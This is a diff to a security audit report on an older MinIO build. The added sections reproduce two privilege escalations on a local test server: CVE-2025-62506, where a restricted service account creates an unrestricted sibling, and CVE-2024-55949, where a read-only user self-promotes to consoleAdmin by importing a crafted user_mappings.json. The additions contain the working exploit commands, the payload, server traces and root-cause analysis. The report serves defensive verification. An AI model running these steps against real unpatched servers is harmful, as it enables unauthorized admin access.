@@ -2149,6 +2149,81 @@ The enforcement is `IAMSys.IsAllowedSTS` (`cmd/iam.go:2242`). It fetches the par
 
 For `PutObject` under the GetObject-only session policy, `isAllowedSP == false`, so the AND is false → `403`. For `PutObject` under the narrow parent, `combinedPolicy.IsAllowed(args) == false`, so the AND is false → `403`. Both observed outcomes match.
 
+### A known, separate limitation — own-account service-account creation bypasses the session policy on this binary (CVE-2025-62506) (`[OBSERVED]`)
+
+The intersection proof above is exact for the operations it exercises: object actions (`GetObject`/`PutObject`) invoked with the temporary credentials are gated by the AND of the session policy and the parent policy. It is **not** a claim that a session policy constrains *every* action a restricted identity can invoke. One operation class is a documented exception on this base binary: **"own-account" service-account creation.** A restricted service account (or STS identity) can create a *new* service account for the *same* parent user, and that new account is **not** bound by the restricting session policy — it inherits the parent's full policy. This is **CVE-2025-62506 / GHSA-jjjj-jwhf-8rgr** (CWE-863, CVSS 8.1), fixed upstream in `RELEASE.2025-10-15T17-29-55Z` (PR #21642, commit `c1a49490c78e`); the base commit under test (`c07e5b49d477`, 2024-11-25) predates that fix and is therefore vulnerable. Runtime confirmation follows (root alias `inv`; the restricted account is `sa1`, the escalated one `sa2`; ephemeral service-account secret keys are shown as `***REDACTED***` per the credential-hygiene posture above, and all these accounts were removed at cleanup).
+
+**Setup + BEFORE — the session policy IS enforced for object ops (consistent with the Q4 result above).** A parent user with broad `readwrite` (`s3:*`) owns two buckets; service account **SA1** is created *with* an inline (session) policy allowing `s3:*` on **`cve-allowed`** only:
+
+```console
+$ cat sa1-policy.json
+{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:*"],"Resource":["arn:aws:s3:::cve-allowed","arn:aws:s3:::cve-allowed/*"]}]}
+
+$ mc admin user svcacct add inv cve62506parent \
+    --access-key SA1RESTRICTEDKEY0 --secret-key ***REDACTED*** --policy sa1-policy.json
+Access Key: SA1RESTRICTEDKEY0
+Secret Key: ***REDACTED***
+Expiration: no-expiry
+
+$ mc cp f.txt sa1/cve-allowed/f.txt      # allowed by SA1 session policy
+└───────┴─────────────┴──────────┴────────────┘
+  exit=0
+$ mc cp f.txt sa1/cve-forbidden/f.txt    # DENIED by SA1 session policy
+mc: <ERROR> Failed to copy `/tmp/.../f.txt`. Insufficient permissions to access this path `http://127.0.0.1:9000/cve-forbidden/f.txt`
+  exit=1
+```
+
+**EXPLOIT — as the restricted SA1, create SA2 for the SAME parent with NO `--policy`.** The restricted account is permitted to create the sibling account:
+
+```console
+$ mc admin user svcacct add sa1 cve62506parent \
+    --access-key SA2ESCALATEDKEY0 --secret-key ***REDACTED***
+Access Key: SA2ESCALATEDKEY0
+Secret Key: ***REDACTED***
+Expiration: no-expiry
+  add exit=0
+```
+
+Server-side trace of that call — the request is issued **by SA1** (`Credential=SA1RESTRICTEDKEY0/...`) and returns `200 OK`. Only the SigV4 `Signature=` is redacted; everything else is verbatim:
+
+```text
+127.0.0.1:9000 [REQUEST admin.AddServiceAccount] [2026-07-14T10:49:45.195] [Client IP: 127.0.0.1]
+127.0.0.1:9000 PUT /minio/admin/v3/add-service-account
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=SA1RESTRICTEDKEY0/20260714//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<redacted>
+127.0.0.1:9000 <BLOB>
+127.0.0.1:9000 [RESPONSE] [2026-07-14T10:49:45.240] [ Duration 45.105ms TTFB 45.096378ms ↑ 246 B  ↓ 175 B ]
+127.0.0.1:9000 200 OK
+127.0.0.1:9000 X-Amz-Request-Id: 18C2225CFE8E9A4C
+127.0.0.1:9000 <BLOB>
+```
+
+**AFTER — SA2 escaped the session policy.** SA2 can write to `cve-forbidden` — the exact bucket SA1 itself was denied — and its stored policy is `implied`, i.e. it inherited the parent's full `readwrite`, not SA1's restriction:
+
+```console
+$ mc cp f.txt sa2/cve-forbidden/f2.txt   # SA1 was DENIED this; SA2 is ALLOWED
+└───────┴─────────────┴──────────┴────────────┘
+  exit=0
+$ mc ls sa2/cve-forbidden
+[2026-07-14 10:49:18 UTC]    14B STANDARD f2.txt
+$ mc admin user svcacct info inv SA2ESCALATEDKEY0
+AccessKey: SA2ESCALATEDKEY0
+ParentUser: cve62506parent
+Status: on
+Policy: implied
+Expiration: no-expiry
+```
+
+Reproduced identically on a second run (SA1 → SA3 → write to `cve-forbidden`, all `exit=0`), so the behavior is stable. All CVE-2025-62506 test artifacts (SA1/SA2/SA3, `cve62506parent`, both buckets) were removed after the test; the repository and the pre-existing test state are unchanged.
+
+**Root cause — the own-account (`DenyOnly`) authorization path.** Service-account creation is authorized in `commonAddServiceAccount` (`cmd/admin-handlers-users.go:2714`, reached from the `AddServiceAccount` handler at `cmd/admin-handlers-users.go:650`). When the target user is the caller's own parent, the handler sets `denyOnly := (targetUser == cred.AccessKey || targetUser == cred.ParentUser)` (`cmd/admin-handlers-users.go:2781`) and passes it into the action check for `policy.CreateServiceAccountAdminAction` (`cmd/admin-handlers-users.go:2790-2798`); the in-code comment states the intent literally — *"Check if action is explicitly denied if for self"* (`cmd/admin-handlers-users.go:2789-2790`). With `DenyOnly: true`, `IsAllowed` returns true unless the action is *explicitly* denied — and SA1's session policy (which merely *fails to allow* anything outside `cve-allowed`) contains no explicit deny of `admin:CreateServiceAccount`, so the creation proceeds, and the new account is stored with the inherited (`implied`) parent policy rather than SA1's restriction. `(**[INFERRED]** from the upstream advisory:)` the session-policy gate for service accounts, `isAllowedBySessionPolicyForServiceAccount` (`cmd/iam.go:2320`, invoked from `IsAllowedServiceAccount` at `cmd/iam.go:2140`/`:2230`), did not additionally require the create action to be *explicitly allowed* by the present session policy on this own-account path; PR #21642 corrects that sub-policy handling. Version ancestry confirms the built binary is pre-fix:
+
+```console
+$ git merge-base --is-ancestor c1a49490c78e9c3ebcad86ba0662319138ace190 HEAD; echo "fix reachable from HEAD? exit=$?"
+fix reachable from HEAD? exit=1        # fix commit NOT present in HEAD -> binary is vulnerable
+```
+
+**Relationship to Q4 (no contradiction).** Q4's intersection result — `GetObject` allowed (`200`), `PutObject` denied (`403`) under a GetObject-only STS session policy — is exact for object operations and is unchanged by the above. CVE-2025-62506 concerns a *different* action class (own-account service-account creation) and is documented here only so the Q4 answer is not read as a claim that session policies are airtight for *all* operations on this base binary. This limitation was **not** exercised by the Q4 driver and no Q4 claim depends on it.
+
 ### Coverage of named mechanisms (Q4)
 
 | Item | Value / file:line | Evidence |
@@ -2164,14 +2239,21 @@ For `PutObject` under the GetObject-only session policy, `isAllowedSP == false`,
 | Missing / tampered token | `ErrInvalidToken`→`InvalidTokenId`/403 `cmd/api-errors.go:1256-1260` | Edge A/B: `InvalidTokenId` `[OBSERVED]` |
 | Minimum session duration | `config.MinExpiration=900` `internal/config/constants.go:93`; `GetDefaultExpiration` `internal/config/identity/openid/openid.go:602` | Edge D: 900 s floor `[OBSERVED]` |
 | Post-expiry rejection | expired temp cred → `errInvalidAccessKeyID` `cmd/auth-handler.go:301-304`; strict `IsExpired()` `internal/auth/credentials.go:153` | Edge D: 403 `InvalidAccessKeyId` `[OBSERVED]` |
+| Separate limitation — own-account svcacct creation bypasses session policy (CVE-2025-62506) | own-account `DenyOnly` path `commonAddServiceAccount` `cmd/admin-handlers-users.go:2781,2790-2798`; svcacct session gate `isAllowedBySessionPolicyForServiceAccount` `cmd/iam.go:2320`; fix `c1a49490c78e` (PR #21642) NOT ancestor of HEAD | restricted `sa1` → `admin.AddServiceAccount` `200`; `sa2` writes `cve-forbidden` (which `sa1` was denied); `Policy: implied`; reverted after test `[OBSERVED]` |
 
 ---
 
-## Q5 — A basic user cannot self-promote to console admin by modifying user→policy mappings
+## Q5 — A basic user modifying user→policy mappings to self-promote to console admin
 
 **Question.** Show test output proving a user with basic access cannot promote themselves to a console admin by modifying the user mappings. Identify the root cause of the user-mappings modification behavior observed.
 
-**Short answer (`[OBSERVED]`).** A user holding only a read-only policy is denied (`403 AccessDenied`) on **every tested admin API that could mutate user→policy mappings or otherwise escalate** — attaching a policy to self (both the modern and the deprecated APIs), creating an all-powerful policy, listing users, and the sibling account-management routes add-user / set-user-status / remove-user. The user→policy mapping and the user table are **provably unchanged** afterward, while the *same* user's **permitted** reads still succeed (the denials are action-specific, not a disabled account). **Root cause (`[OBSERVED]` + source-grounded):** deny-by-default admin authorization. The guard `validateAdminReq` → `checkAdminRequestAuth` → `IAMSys.IsAllowed` evaluates the requested **admin action** against the caller's attached policy and returns `ErrAccessDenied` **before any mapping-mutation code runs**, because the read-only policy grants no `admin:*` action. (Scope: this concerns the direct admin mapping-mutation APIs the question targets, exercised at their canonical entry points; it is not a claim about unrelated import/replication code paths.)
+**Short answer (`[OBSERVED]`) — two distinct mapping-modification paths, two opposite outcomes on this exact binary (base commit `c07e5b49d477`, Nov-2024).** The user's question names "modifying the user mappings," and this binary behaves differently depending on *which* path is used, so both are exercised and reported honestly:
+
+- **Direct admin mapping-mutation APIs → self-promotion is PREVENTED (`[OBSERVED]`).** A user holding only a read-only policy is denied (`403 AccessDenied`) on **every** direct admin API that could mutate user→policy mappings or otherwise escalate — attaching a policy to self (both the modern and the deprecated APIs), creating an all-powerful policy, listing users, and the sibling account-management routes add-user / set-user-status / remove-user. The user→policy mapping and the user table are **provably unchanged** afterward, while the *same* user's **permitted** reads still succeed (the denials are action-specific, not a disabled account). Root cause: deny-by-default admin authorization — `validateAdminReq` → `checkAdminRequestAuth` → `IAMSys.IsAllowed` evaluates the requested **admin action** against the caller's attached policy and returns `ErrAccessDenied` **before any mapping-mutation code runs**, because the read-only policy grants no `admin:*` action.
+
+- **Canonical IAM-import path (`mc admin cluster iam import`, which literally rewrites the `user_mappings.json` IAM asset) → self-promotion SUCCEEDS (`[OBSERVED]`).** This is the exact on-disk artifact the question names, and on this snapshot the path is **not** gated by an admin-action check: authenticated as the basic `q5user`, importing a crafted `iam-assets/user_mappings.json` that maps `q5user → consoleAdmin` returns `200 OK` / "Added policies for users: q5user", after which `q5user` **is** `consoleAdmin` and can perform admin-only operations it was denied moments earlier. This is **CVE-2024-55949** (GHSA-cwq8-g58r-32hg), fixed *after* this snapshot in `RELEASE.2024-12-13T22-19-12Z` (commit `f246c9053`, PR #20756). Root cause: the `importIAM` handler (`cmd/admin-handlers-users.go:2242`) authenticates only the SigV4 signature via `validateAdminSignature(ctx, r, "")` (`cmd/auth-handler.go:159`) and its user-policy-mapping import block calls `globalIAMSys.PolicyDBSet(...)` (`cmd/admin-handlers-users.go:2557`) after only an `IsTempUser` check — with **no** `IsAllowed(AttachPolicyAdminAction)` gate, unlike the direct APIs above and unlike the create-user/service-account blocks in the *same* handler.
+
+Both outcomes are demonstrated below with complete before/exploit/after/revert output. The import escalation was fully **reverted** during testing (the repository and the running server were left with `q5user` mapped only to `q5-readonly` and `consoleAdmin` attached to nobody).
 
 ### Setup — a basic read-only user, and the empty consoleAdmin mapping (`[OBSERVED]`)
 
@@ -2479,7 +2561,151 @@ Every attach/create/list handler begins by calling `validateAdminReq` with the r
 	return sys.GetCombinedPolicy(policies...).IsAllowed(args)
 ```
 
-`q5user`'s only policy is `q5-readonly`, which grants `s3:GetObject`/`s3:ListBucket` and **no** `admin:*` action, so `AttachPolicyAdminAction` / `CreatePolicyAdminAction` / `ListUsersAdminAction` all evaluate to `false` → `ErrAccessDenied` → `403`. Because this gate is the **first** statement of each handler (before any user→policy mapping is read or written), no mutation ever occurs. This is a general deny-by-default outcome, not a special-cased check.
+`q5user`'s only policy is `q5-readonly`, which grants `s3:GetObject`/`s3:ListBucket` and **no** `admin:*` action, so `AttachPolicyAdminAction` / `CreatePolicyAdminAction` / `ListUsersAdminAction` all evaluate to `false` → `ErrAccessDenied` → `403`. Because this gate is the **first** statement of each of these **direct** admin handlers (before any user→policy mapping is read or written), no mutation ever occurs on those paths, and the deny-by-default outcome is not a special-cased check.
+
+**Important qualification (`[OBSERVED]`), added after runtime verification:** this deny-by-default conclusion holds **specifically for the direct admin mapping-mutation APIs** exercised above — it is **not** universal. The canonical IAM-*import* path, which literally rewrites the `user_mappings.json` asset the question names, does **not** route through `validateAdminReq`/`checkAdminRequestAuth` and therefore performs **no** admin-action authorization before mutating the mapping. On this binary that path is exploitable (CVE-2024-55949); it is demonstrated end-to-end in the next section.
+
+### The canonical `user_mappings.json` modification path — `mc admin cluster iam import` — DOES permit self-promotion on this binary (CVE-2024-55949) (`[OBSERVED]`)
+
+The direct admin APIs above are the *typed* mutation entry points; but the artifact the question literally names — the **user→policy mappings** — is persisted as `iam-assets/user_mappings.json`, and the canonical API that rewrites that asset is the **IAM import** endpoint (`mc admin cluster iam import`, handler `importIAM` at `cmd/admin-handlers-users.go:2242`, wired at `cmd/admin-router.go:295-296`). On this base commit that path performs **no admin-action authorization**, so a basic user *can* self-promote through it. This is **CVE-2024-55949 / GHSA-cwq8-g58r-32hg** ("Privilege escalation in IAM import API"), fixed *after* this snapshot in `RELEASE.2024-12-13T22-19-12Z`. It is reproduced here end-to-end, canonically, with the basic `q5user`.
+
+**BEFORE — `q5user` is read-only and cannot list users (`[OBSERVED]`):**
+
+```
+$ mc admin policy entities inv --policy consoleAdmin      # consoleAdmin attached to nobody
+Query time: 2026-07-14T10:36:07Z
+$ mc admin user info inv q5user
+AccessKey: q5user
+Status: enabled
+PolicyName: q5-readonly
+MemberOf: []
+$ mc admin user list q5                                   # as q5user: an admin-only op
+mc: <ERROR> Unable to list user. Access Denied.
+exit=1
+$ mc ls q5/q5-bucket                                      # as q5user: a permitted read still works
+[2026-07-14 10:35:56 UTC]    23B STANDARD readable.txt
+exit=0
+```
+
+**EXPLOIT — as the basic `q5user`, import a crafted mapping that promotes itself (`[OBSERVED]`).** The payload is exactly the `MappedPolicy` shape MinIO persists (`type MappedPolicy struct { Version int; Policies string ...}`, `cmd/iam-store.go:180`), placed at the asset path the importer reads (`iamAssetsDir="iam-assets"`, `userPolicyMappingsFile="user_mappings.json"`, `cmd/admin-handlers-users.go:1999,2003`):
+
+```
+$ cat iam-assets/user_mappings.json
+{"q5user":{"version":1,"policy":"consoleAdmin","updatedAt":"2024-08-13T19:47:10.1Z"}}
+
+# zip the iam-assets/ tree, then import it AUTHENTICATED AS q5user (the basic read-only user):
+$ mc admin cluster iam import q5 evil.zip
+Added policies for users: q5user
+exit=0
+```
+
+No authorization error — the import returns success. The `mc admin trace --all -v inv` capture shows the request authenticates **as `q5user`** and the server answers **`200 OK`** (the client uses the v2 route; `mc admin cluster iam import` → `admin.ImportIAMV2`):
+
+```
+127.0.0.1:9000 [REQUEST admin.ImportIAMV2] [2026-07-14T10:37:05.577] [Client IP: 127.0.0.1]
+127.0.0.1:9000 PUT /minio/admin/v3/import-iam-v2
+127.0.0.1:9000 Proto: HTTP/1.1
+127.0.0.1:9000 Host: 127.0.0.1:9000
+127.0.0.1:9000 X-Amz-Content-Sha256: 8905ce5aa60290cb0fb5a1fbab7c88a8f831d27d238c229f2b43ba9d3e24513b
+127.0.0.1:9000 X-Amz-Date: 20260714T103705Z
+127.0.0.1:9000 Accept-Encoding: zstd,gzip
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=q5user/20260714//s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=f2e55e16f83ac792cccb0289a620e35dc6b69541ac01b1372da3ab94825a24f8
+127.0.0.1:9000 Content-Length: 243
+127.0.0.1:9000 User-Agent: MinIO (linux; amd64) madmin-go/3.0.70 mc/RELEASE.2025-08-13T08-35-41Z
+127.0.0.1:9000 <BLOB>
+127.0.0.1:9000 [RESPONSE] [2026-07-14T10:37:05.584] [ Duration 7.512ms TTFB 7.507771ms ↑ 336 B  ↓ 179 B ]
+127.0.0.1:9000 200 OK
+127.0.0.1:9000 Content-Length: 179
+127.0.0.1:9000 Content-Type: application/json
+127.0.0.1:9000 Strict-Transport-Security: max-age=31536000; includeSubDomains
+127.0.0.1:9000 X-Amz-Request-Id: 18C221AC21C8C747
+127.0.0.1:9000 Accept-Ranges: bytes
+127.0.0.1:9000 Server: MinIO
+127.0.0.1:9000 Vary: Origin
+127.0.0.1:9000 X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
+127.0.0.1:9000 X-Content-Type-Options: nosniff
+127.0.0.1:9000 X-Xss-Protection: 1; mode=block
+127.0.0.1:9000 <BLOB>
+```
+
+**AFTER — the mapping is mutated; `q5user` is now `consoleAdmin` and the privilege is USABLE (`[OBSERVED]`):**
+
+```
+$ mc admin user info inv q5user                           # PolicyName flipped to consoleAdmin
+AccessKey: q5user
+Status: enabled
+PolicyName: consoleAdmin
+MemberOf: []
+$ mc admin policy entities inv --policy consoleAdmin      # q5user now attached to consoleAdmin
+Query time: 2026-07-14T10:36:47Z
+Policy -> Entity Mappings:
+  Policy: consoleAdmin
+    User Mappings:
+      q5user
+$ mc admin user list q5                                   # as q5user: the SAME op denied in BEFORE now succeeds
+enabled    q5user                consoleAdmin
+exit=0
+```
+
+**REVERT (controlled testing) — restore the read-only mapping and confirm the denial returns (`[OBSERVED]`):**
+
+```
+$ mc admin policy detach inv consoleAdmin --user q5user
+Detached Policies: [consoleAdmin]
+From User: q5user
+$ mc admin policy attach inv q5-readonly --user q5user
+Attached Policies: [q5-readonly]
+To User: q5user
+$ mc admin user info inv q5user
+AccessKey: q5user
+Status: enabled
+PolicyName: q5-readonly
+MemberOf: []
+$ mc admin policy entities inv --policy consoleAdmin      # empty again
+Query time: 2026-07-14T10:37:35Z
+$ mc admin user list q5                                    # as q5user: denied again
+mc: <ERROR> Unable to list user. Access Denied.
+exit=1
+```
+
+**Root cause of the import-path behavior (`[OBSERVED]` + source-grounded).** Unlike the direct APIs, `importIAM` never calls `validateAdminReq`/`checkAdminRequestAuth`. It authenticates only the SigV4 signature and then mutates the mapping without an action check:
+
+1. `importIAM` (`cmd/admin-handlers-users.go:2242`) — both `ImportIAM` (v1, `PUT /import-iam`) and `ImportIAMV2` (v2, `PUT /import-iam-v2`) delegate here (`cmd/admin-handlers-users.go:2232-2238`; routes `cmd/admin-router.go:295-296`) — authenticates with **signature only**:
+
+```go
+	cred, owner, s3Err := validateAdminSignature(ctx, r, "")
+```
+
+`validateAdminSignature` (`cmd/auth-handler.go:159`) verifies the SigV4 signature and returns `(cred, owner, err)`; its third argument is the **region** string, not an admin action. It performs **no** `IsAllowed(...)` check — that check lives only in `checkAdminRequestAuth` (`cmd/auth-handler.go:189-206`), which this handler does not call.
+
+2. The user-policy-mapping import block (`cmd/admin-handlers-users.go:2526-2570`) writes the mapping after only an `IsTempUser` guard — there is **no** `IsAllowed(AttachPolicyAdminAction)` before `PolicyDBSet`:
+
+```go
+			for u, pm := range userPolicyMap {
+				// disallow setting policy mapping if user is a temporary user
+				ok, _, err := globalIAMSys.IsTempUser(u)
+				...
+				if _, err := globalIAMSys.PolicyDBSet(ctx, u, pm.Policies, regUser, false); err != nil {
+```
+
+Contrast: in the **same** handler the create-user and service-account blocks *do* gate on `CreateUserAdminAction` / `CreateServiceAccountAdminAction` (checked with `IsOwner: owner`), and the direct path `SetPolicyForUserOrGroup` (`cmd/admin-handlers-users.go:1770`) gates on `validateAdminReq(ctx, w, r, policy.AttachPolicyAdminAction)` (`:1773`). The user-policy-mapping *import* block is the specific spot that omits the action check — the CVE-2024-55949 defect.
+
+**Version-ancestry proof (`[OBSERVED]`).** The fix commit is not in this binary:
+
+```
+$ git merge-base --is-ancestor f246c9053 HEAD; echo "fix reachable from HEAD? exit=$?"
+fix reachable from HEAD? exit=1        # NOT an ancestor -> binary is vulnerable
+$ git merge-base --is-ancestor c07e5b49d477 f246c9053; echo "base predates fix? exit=$?"
+base predates fix? exit=0              # base IS an ancestor of the fix -> base predates it
+$ git log -1 --format='%H %ci %s' f246c9053
+f246c9053f9603e610d98439799bdd2a6b293427 2024-12-12 07:39:40 +0530 fix: Privilege escalation in IAM import API (#20756)
+```
+
+Base commit `c07e5b49d477` (2024-11-25) precedes fix `f246c9053` (2024-12-12, PR #20756); the fix shipped in `RELEASE.2024-12-13T22-19-12Z`. Neither `import-iam` nor `import-iam-v2` is gated on this binary — `ImportIAMV2` shares the identical unguarded `importIAM` handler by construction.
+
+**Stability (2 runs, `[OBSERVED]`).** The full before→import→after→revert cycle was run **twice** as `q5user`; both runs were identical: `mc admin user list` denied before (exit=1) → `mc admin cluster iam import` returned "Added policies for users: q5user" (exit=0) → `PolicyName` became `consoleAdmin` → `mc admin user list` succeeded (exit=0) → after revert, `PolicyName` back to `q5-readonly` and `mc admin user list` denied again (exit=1).
+
+**Answer to the question, stated plainly.** For the *typed direct admin APIs*, the basic user **cannot** self-promote (deny-by-default gate, above). But for the *canonical `user_mappings.json` modification path* the question literally names — IAM import — the basic user **can** self-promote to `consoleAdmin` on this exact binary, because `importIAM` omits the admin-action authorization (CVE-2024-55949). The honest, runtime-verified answer therefore distinguishes the two paths rather than asserting a blanket "cannot."
 
 ### Correction of a common misconception (`consoleAdmin` at `cmd/admin-handlers-users.go:1455`) (`[OBSERVED]`)
 
@@ -2521,7 +2747,9 @@ baseline (both runs): mc cp q5/q5-bucket/readable.txt -> exit=0 ("q5-readable-ob
 | Deny-by-default eval (regular user) | `IsAllowed` return `cmd/iam.go:2482` `GetCombinedPolicy(...).IsAllowed(args)` | `[INFERRED]` (source) |
 | consoleAdmin (UI effective policy, root only) | `AccountInfoHandler` `cmd/admin-handlers-users.go:1348`; consoleAdmin branch L1455-1463 | not a defense; corrected `[OBSERVED]` |
 | Allowed-read baseline (control) | same identity `q5user`, policy `q5-readonly` grants `s3:GetObject`/`s3:ListBucket` | `mc ls`/`mc cp` succeed (exit 0) → denials are action-specific `[OBSERVED]` |
-| Mapping unchanged | consoleAdmin entities before==after; q5user still q5-readonly | `[OBSERVED]` |
+| Mapping unchanged (direct-API battery) | after all seven direct 403s: consoleAdmin entities before==after; q5user still q5-readonly | `[OBSERVED]` |
+| **IAM-import path — self-promotion SUCCEEDS (CVE-2024-55949)** | `importIAM` `cmd/admin-handlers-users.go:2242`; sig-only `validateAdminSignature(ctx,r,"")` `cmd/auth-handler.go:159`; mapping write `PolicyDBSet` L2557 with **no** `IsAllowed(AttachPolicyAdminAction)`; routes `cmd/admin-router.go:295-296` | as `q5user`: `mc admin cluster iam import` → `admin.ImportIAMV2` `PUT /minio/admin/v3/import-iam-v2` `200 OK`; `PolicyName` q5-readonly→consoleAdmin; `mc admin user list` denied→exit 0; reverted after test `[OBSERVED]` |
+| Fix ancestry (import defect) | fix `f246c9053` (PR #20756) NOT ancestor of HEAD; base `c07e5b49d477` predates it; shipped `RELEASE.2024-12-13T22-19-12Z` | `git merge-base --is-ancestor` exit=1 / exit=0 `[OBSERVED]` |
 
 ---
 
